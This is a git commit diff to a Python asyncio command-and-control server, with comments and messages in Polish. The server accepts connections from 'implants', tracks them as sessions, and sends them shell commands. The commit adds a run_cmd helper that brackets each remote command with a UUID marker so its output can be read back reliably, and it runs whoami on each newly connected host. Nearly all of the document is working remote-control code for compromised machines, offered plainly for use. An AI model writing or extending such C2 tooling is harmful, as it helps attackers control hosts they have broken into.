9e11d2c1ff379d697dacabd83cf91821a6a9da8d
Therr <133943286+ctr-alt-f3@users.noreply.github.com>
2025-12-31 13:13:00 +0100

    new futures+bugfixes
    - added function "run_cmd" for easier cmd execution
    - now using uuid's commands are executed (so you know when command ends)

--- async_C2_server.py
+++ async_C2_server.py
@@ -2,18 +2,41 @@
 from threading import *
 from time import *
 from asyncio import *
-
+from uuid import *
 sesje = {}
+
+async def run_cmd(reader, writer, command):
+    granica = str(uuid4()).encode()
+    full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
+    try:
+        await wait_for(reader.read(4096), timeout=0.1)
+    except TimeoutError:
+        pass 
+    writer.write(full_cmd)
+    await writer.drain()
+    odp = b""
+    while granica not in odp:
+        try:
+            chunk = await wait_for(reader.read(4096),timeout=5)
+            if not chunk:
+                raise ConnectionError("[-]problem z połączeniem z implantem")
+            odp+=chunk
+        except TimeoutError:
+            raise ConnectionError("[-]timeout ended")
+    output = odp.rsplit(granica,1)[0]
+    return output.strip()
+
+
+
 
 async def handler(reader,writer):
     addr = writer.get_extra_info('peername')
     print(f"[N] znaleziono połączenie z {addr}")
     sesje[addr] = writer
-    try:
-        writer.write(b'whoami')
-        await writer.drain()
-        odp = await reader.read(100)
-        print(f"[I] kolega ma na imie {odp.decode().strip()}")
+    try:    
+        output = await run_cmd(reader,writer,"whoami")
+        print(f"komenda whoami dla {addr} wysłana")  
+        print(f"[I] kolega {addr} ma na imie {output.decode().strip()}")
        
         while True:
             data = await reader.read(1024)
@@ -30,7 +53,7 @@ async def handler(reader,writer):
         if addr in sesje: del sesje[addr]
 
 async def main():
-    server = await start_server(handler,'0.0.0.0','4330')
+    server = await start_server(handler,'0.0.0.0','2137')
     print("[+] Serwer został uruchomiony")
     async with server:
         await server.serve_forever()
